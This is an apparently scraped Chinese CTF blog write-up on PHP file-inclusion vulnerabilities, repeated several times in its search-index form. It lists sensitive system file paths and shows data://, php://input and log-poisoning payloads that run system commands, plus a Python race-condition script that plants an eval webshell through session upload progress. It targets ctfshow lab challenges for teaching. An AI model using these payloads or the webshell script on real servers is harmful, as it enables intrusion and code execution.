包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#常见敏感信息路径"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#配合文件上传使用"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#包含apache日志文件"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#包含session文件"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#包含临时文件"},{"categories":["CTF","web"],"content":"\r远程文件包含(RFI)PHP的配置选项allow_url_include、allow_url_fopen状态为ON，则include/require函数是可以加载远程文件，在这种情况下可能产生RFI漏洞 可以来远程读取恶意webshell文件 截断方法：%00截断（php\u003c5.3.4）、?截断（?后内容被视作GET传参） ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:2","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#远程文件包含rfi"},{"categories":["CTF","web"],"content":"\rPHP伪协议\rfile://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。 php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 利用条件: allow_url_fopen ：off/on allow_url_include：off/on 例如有些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码不会直接显示到页面上，则我们可以利用php://filter/convert.base64-encode/resource=文件路径来得到base64编码后的字符串，通过base64解码即可得到php完整源码 php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 利用条件: allow_url_fopen ：off/on allow_url_include：on ZIP://协议zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 zip://中只能传入绝对路径。 要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换） 只需要是zip的压缩包即可，后缀名可以任意更改。 相同的类型还有zlib://和bzip2:// 利用条件: allow_url_fopen ：off/on allow_url_include：off/on POC： zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt data://协议data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数： 利用条件: allow_url_fopen ：on allow_url_include：on POC： data://text/plain,\u003c?php phpinfo();?\u003e //如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入： data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#php伪协议"},{"categories":["CTF","web"],"content":"\rPHP伪协议\rfile://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。 php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 利用条件: allow_url_fopen ：off/on allow_url_include：off/on 例如有些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码不会直接显示到页面上，则我们可以利用php://filter/convert.base64-encode/resource=文件路径来得到base64编码后的字符串，通过base64解码即可得到php完整源码 php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 利用条件: allow_url_fopen ：off/on allow_url_include：on ZIP://协议zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 zip://中只能传入绝对路径。 要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换） 只需要是zip的压缩包即可，后缀名可以任意更改。 相同的类型还有zlib://和bzip2:// 利用条件: allow_url_fopen ：off/on allow_url_include：off/on POC： zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt data://协议data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数： 利用条件: allow_url_fopen ：on allow_url_include：on POC： data://text/plain,\u003c?php phpinfo();?\u003e //如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入： data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#file协议"},{"categories":["CTF","web"],"content":"\rPHP伪协议\rfile://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。 php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 利用条件: allow_url_fopen ：off/on allow_url_include：off/on 例如有些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码不会直接显示到页面上，则我们可以利用php://filter/convert.base64-encode/resource=文件路径来得到base64编码后的字符串，通过base64解码即可得到php完整源码 php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 利用条件: allow_url_fopen ：off/on allow_url_include：on ZIP://协议zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 zip://中只能传入绝对路径。 要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换） 只需要是zip的压缩包即可，后缀名可以任意更改。 相同的类型还有zlib://和bzip2:// 利用条件: allow_url_fopen ：off/on allow_url_include：off/on POC： zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt data://协议data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数： 利用条件: allow_url_fopen ：on allow_url_include：on POC： data://text/plain,\u003c?php phpinfo();?\u003e //如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入： data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#php协议"},{"categories":["CTF","web"],"content":"\rPHP伪协议\rfile://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。 php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 利用条件: allow_url_fopen ：off/on allow_url_include：off/on 例如有些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码不会直接显示到页面上，则我们可以利用php://filter/convert.base64-encode/resource=文件路径来得到base64编码后的字符串，通过base64解码即可得到php完整源码 php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 利用条件: allow_url_fopen ：off/on allow_url_include：on ZIP://协议zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 zip://中只能传入绝对路径。 要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换） 只需要是zip的压缩包即可，后缀名可以任意更改。 相同的类型还有zlib://和bzip2:// 利用条件: allow_url_fopen ：off/on allow_url_include：off/on POC： zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt data://协议data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数： 利用条件: allow_url_fopen ：on allow_url_include：on POC： data://text/plain,\u003c?php phpinfo();?\u003e //如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入： data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#zip协议"},{"categories":["CTF","web"],"content":"\rPHP伪协议\rfile://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。 php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 利用条件: allow_url_fopen ：off/on allow_url_include：off/on 例如有些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码不会直接显示到页面上，则我们可以利用php://filter/convert.base64-encode/resource=文件路径来得到base64编码后的字符串，通过base64解码即可得到php完整源码 php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 利用条件: allow_url_fopen ：off/on allow_url_include：on ZIP://协议zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 zip://中只能传入绝对路径。 要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换） 只需要是zip的压缩包即可，后缀名可以任意更改。 相同的类型还有zlib://和bzip2:// 利用条件: allow_url_fopen ：off/on allow_url_include：off/on POC： zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt data://协议data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数： 利用条件: allow_url_fopen ：on allow_url_include：on POC： data://text/plain,\u003c?php phpinfo();?\u003e //如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入： data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#data协议"},{"categories":["CTF","web"],"content":"\r伪协议利用条件\r","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:4","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#伪协议利用条件"},{"categories":["CTF","web"],"content":"\r文件包含漏洞防护1、使用str_replace等方法过滤掉危险字符 2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中） 3、php版本升级，防止%00截断 4、对上传的文件进行重命名，防止被读取 5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。 6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#文件包含漏洞防护"},{"categories":["CTF","web"],"content":"\r靶场题目：","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web78]php伪协议 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 10:52:43 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 10:54:20 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; include($file); }else{ highlight_file(__FILE__); } 通过php伪协议来读取文件目录： http://44a76034-124a-4121-952d-6773e75c37d4.challenge.ctf.show/?file=data://text/plain,\u003c?php system('ls');?\u003e 读取flag内容： http://44a76034-124a-4121-952d-6773e75c37d4.challenge.ctf.show/?file=data://text/plain,\u003c?php system('cat flag.php');?\u003e 直接cat可能没有回显，通过查看页面源码即可得到flag ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web78php伪协议"},{"categories":["CTF","web"],"content":"\r[web79]php伪协议bypass \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:10:14 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 11:12:38 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(\"php\", \"???\", $file); include($file); }else{ highlight_file(__FILE__); } 法一 替换了payload的中的php，可以构造一下payload： http://58452d9a-e437-4cf8-b189-168ac79426dc.challenge.ctf.show/?file=data://text/plain,\u003c?=system('ls');?\u003e 读取flag.php http://58452d9a-e437-4cf8-b189-168ac79426dc.challenge.ctf.show/?file=data://text/plain,\u003c?=system('tac flag*');?\u003e 法二 可以使用input协议 POST /?file=Php://input HTTP/1.1 \u003c?Php system(\"ls\");?\u003e POST /?file=Php://input HTTP/1.1 \u003c?Php system(\"cat flag.php\");?\u003e 法三 data协议+base64加密 /?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw== # \u003c?php system('ls'); /?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= # \u003c?php system('cat flag.php'); ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:2","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web79php伪协议bypass"},{"categories":["CTF","web"],"content":"\r[web80]php伪协议POST \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 11:26:29 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); include($file); }else{ highlight_file(__FILE__); } 又替换了php，我们可以使用input协议，首先打开burpsuite开启拦截，然后在HackBar发POST包： http://164bc5d8-06d4-4422-b19f-3ca65d68f6ef.challenge.ctf.show/?file=PHP://input 然后在bp拦截的报文末尾添加POST传参内容 \u003c?php system('ls');?\u003e 发包后发现fl0g.php文件 重复上述操作，修改POST传参中的命令 \u003c?php system('tac fl0g.php');?\u003e 得到flag内容： ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web80php伪协议post"},{"categories":["CTF","web"],"content":"\r[web81]日志包含 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 15:51:31 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); $file = str_replace(\":\", \"???\", $file); include($file); }else{ highlight_file(__FILE__); } php、data、：（冒号）都失效了 可以读取日志信息 在url后面加入日志文件的路径 ?file=/var/log/nginx/access.log 进行两次发包，第一次将User-Agent修改为 \u003c?php system('ls');?\u003e 得到回显之后进行第二次发包，随后得到 得到flag存放的具体文件，随后进行第三次发包 跟第一次发包类似，将User-Agent改为\u003c?php system('tac fl0g.php');?\u003e发包后可得到flag ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:4","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web81日志包含"},{"categories":["CTF","web"],"content":"\r[web82]条件竞争 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 19:34:45 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); $file = str_replace(\":\", \"???\", $file); $file = str_replace(\".\", \"???\", $file); include($file); }else{ highlight_file(__FILE__); } ​ 过滤了点之后我们也不能使用文件包含来getshell了，因此我们只能利用无后缀的文件，因为在php中我们能够利用的无后缀的文件就是session，我们可以利用session.upload_progress来进行文件包含，利用PHP_SESSION_UPLOAD_PROGRESS参数 前瞻知识 该功能是在php5.4添加的，首先先了解下php.ini以下的几个默认选项 session.upload_progress.enable = on session.upload_progress.cleanup = on session.upload_progress.prefix = \"upload_progress_\" session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\" enable = on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ； cleanup = on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要； name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控； prefix+name将表示为session中的键名; 另外还有一个session配置中的重要选项：session.use_strict_mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。 过程分析 如果session.auto_start=on，则php会在接收请求的时候会自动初始化Session，不再需要执行session_start()。 但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=rikka，PHP将会在服务器上创建一个文件/tmp/sess_rikka。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里； 简而言之，我们自定义的PHPSESSID的值会变成文件名，比如定义PHPSESSID:rikka，文件名即为/tmp/sess_rikka，而PHP_SESSION_UPLOAD_PROGRESS的值即为该文件的内容 可以直接用脚本进行发包 import requests import threading import io url = \"http://522071b1-f31d-4623-80b8-334e5e39b8b4.challenge.ctf.show/\" sessID = 'rikka' data = { \"1\": \"file_put_contents('/var/www/html/1.php', '\u003c?php eval($_POST[2]);?\u003e');\" # read()中需要post的内容 } def write(session): fileBytes = io.BytesIO(b'a' * 1024 * 50) while True: res = session.post(url, data={ 'PHP_SESSION_UPLOAD_PROGRESS': '\u003c?php eval($_POST[1]);?\u003e' # 改参数的值就是/tmp/sess_rikka文件的内容 }, cookies={ \"PHPSESSID\": sessID }, files={ 'file': ('rikka.png', fileBytes) } ) def read(session): while True: res1 = session.post(url + '?file=/tmp/sess_' + sessID, data=data, cookies={ \"PHPSESSID\": sessID }) res2 = session.get(url+'1.php') if res2.status_code == 200: print(\"+++done+++\") else: print(res2.status_code) if __name__ == '__main__': event = threading.Event() # 开启多线程的对象 with requests.session() as session: for i in range(5): # 开5个线程 threading.Thread(target=write, args=(session,)).start() for i in range(5): threading.Thread(target=read, args=(session,)).start() event.set() # 唤醒线程 成功后访问http://522071b1-f31d-4623-80b8-334e5e39b8b4.challenge.ctf.show/1.php然后POST发包进行命令执行 下面这种方法比较麻烦： 构造一个文件上传的表单， \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003cbody\u003e \u003cform action=\"http://522071b1-f31d-4623-80b8-334e5e39b8b4.challenge.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /\u003e \u003cinput type=\"file\" name=\"file\" /\u003e \u003cinput type=\"submit\" value=\"submit\" /\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 上传1.php文件同时抓包，添加 Cookie :PHPSESSID=flag session文件的位置我们根据上文的常见的几个测试，在/tmp/sess_PHPSESSID下成功访问且不报错，说明在/tmp/sess_PHPSESSID目录下, 